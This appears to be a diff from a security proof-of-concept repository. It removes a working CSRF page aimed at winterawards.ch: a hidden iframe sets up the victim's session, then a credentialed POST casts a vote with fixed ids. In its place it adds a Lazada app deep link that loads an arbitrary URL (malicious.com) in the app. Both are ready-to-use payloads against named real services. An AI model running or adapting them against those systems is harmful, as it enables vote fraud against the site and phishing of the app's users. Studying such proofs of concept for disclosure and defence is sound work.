@@ -1,27 +1,4 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="UTF-8">
-<script>
-function csrf() {
-    fetch('https://winterawards.ch/app/votes/vote', {
-        method: 'POST',
-        credentials: 'include',
-        mode: 'no-cors',
-        body: '{"categoryId":2,"resortId":78}'
-    });
-}
-function attack() {
-    // The iframe will create an authenticates session for the victim.
-    // Wait a bit for the authentication to take place, then send our CSRF.
-    setTimeout(csrf, 2000);
-}
-</script>
-</head>
-<body style="margin:0px">
-<iframe src="https://winterawards.ch/mitmachen/"
-        hidden
-        onload="attack()">
-</iframe>
-</body>
+<a href="lazada://messages.lazada.com?message_target_url=https://malicious.com">Arbitrary URLs</a>
 </html>
